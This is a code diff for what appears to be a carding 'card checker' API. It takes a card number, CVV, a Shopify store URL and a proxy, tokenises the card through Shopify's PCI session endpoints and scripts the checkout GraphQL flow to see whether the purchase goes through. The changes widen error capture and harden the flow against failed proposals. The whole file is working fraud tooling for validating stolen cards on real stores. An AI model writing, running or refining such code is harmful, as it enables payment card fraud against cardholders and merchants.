@@ -21,9 +21,9 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python X-Ray Perfect"):
-    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
-    final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
+def safe_response(msg, raw_data, price, gate="Python X-Ray Deep"):
+    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:250] if raw_data else "No Raw Data"
+    final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": final_msg, "Price": clean_price, "Gate": gate}
 
@@ -122,12 +122,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
             res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
-            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
+            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:100], price))
             card_session_id = res_pci.json().get("id")
 
-            # =========================================================
-            # بناء القالب المطابق 100% للكود اللي أنت سحبته
-            # =========================================================
             flat_address = {
                 "address1": buyer["address1"],
                 "address2": "",
@@ -141,7 +138,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             
             partial_address = flat_address.copy()
-            partial_address["oneTimeUse"] = False # المتغير الإجباري الجديد
+            partial_address["oneTimeUse"] = False
 
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
@@ -152,79 +149,39 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             
             prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
             
-            # الهيكل المنسوخ من المتصفح بالمللي
             prop_vars = {
-                "sessionInput": {
-                    "sessionToken": session_token
-                },
+                "sessionInput": {"sessionToken": session_token},
                 "delivery": {
-                    "deliveryLines": [
-                        {
-                            "destination": {
-                                "partialStreetAddress": partial_address
-                            },
-                            "selectedDeliveryStrategy": {
-                                "deliveryStrategyByHandle": {
-                                    "handle": "any",
-                                    "customDeliveryRate": False
-                                },
-                                "options": {}
-                            },
-                            "targetMerchandiseLines": {
-                                "lines": [{"stableId": merch_id}]
-                            },
-                            "deliveryMethodTypes": ["SHIPPING"],
-                            "expectedTotalPrice": {
-                                "any": True
-                            },
-                            "destinationChanged": False
-                        }
-                    ],
+                    "deliveryLines": [{
+                        "destination": {"partialStreetAddress": partial_address},
+                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}},
+                        "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
+                        "deliveryMethodTypes": ["SHIPPING"],
+                        "expectedTotalPrice": {"any": True},
+                        "destinationChanged": False
+                    }],
                     "noDeliveryRequired": [],
                     "useProgressiveRates": False,
                     "prefetchShippingRatesStrategy": None,
                     "supportsSplitShipping": True
                 },
                 "payment": {
-                    "totalAmount": {
-                        "any": True
-                    },
+                    "totalAmount": {"any": True},
                     "paymentLines": [],
-                    "billingAddress": {
-                        "streetAddress": flat_address
-                    }
+                    "billingAddress": {"streetAddress": flat_address}
                 },
                 "merchandise": {
-                    "merchandiseLines": [
-                        {
-                            "stableId": merch_id,
-                            "merchandise": {
-                                "productVariantReference": {
-                                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
-                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
-                                    "properties": [],
-                                    "sellingPlanId": None,
-                                    "sellingPlanDigest": None
-                                }
-                            },
-                            "quantity": {
-                                "items": {
-                                    "value": 1
-                                }
-                            },
-                            "expectedTotalPrice": {
-                                "any": True
-                            },
-                            "lineComponentsSource": None,
-                            "lineComponents": []
-                        }
-                    ]
+                    "merchandiseLines": [{
+                        "stableId": merch_id,
+                        "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
+                        "quantity": {"items": {"value": 1}},
+                        "expectedTotalPrice": {"any": True},
+                        "lineComponentsSource": None,
+                        "lineComponents": []
+                    }]
                 },
                 "buyerIdentity": {
-                    "customer": {
-                        "presentmentCurrency": "USD",
-                        "countryCode": "US"
-                    },
+                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                     "email": buyer["email"],
                     "emailChanged": False,
                     "phoneCountryCode": "US",
@@ -235,10 +192,17 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
-            queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
+            res_prop_json = res_prop.json()
+            
+            # 1. منع الانهيار لو السيرفر ماردش ببيانات (حل مشكلة NoneType)
+            data_obj = res_prop_json.get('data')
+            if not data_obj:
+                return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price))
+                
+            queue_token = data_obj.get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
             
             if not queue_token: 
-                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:100], price))
+                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
             time.sleep(1)
 
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
@@ -275,11 +239,12 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if sub_data.get('__typename') == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
-                return JSONResponse(content=safe_response("Shopify System Rejected", msg, price))
+                # توسيع الرادار لكشف الخطأ الكامل
+                return JSONResponse(content=safe_response("Shopify System Rejected", res_sub.text[:250], price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
-                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:100], price))
+                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:250], price))
 
             poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
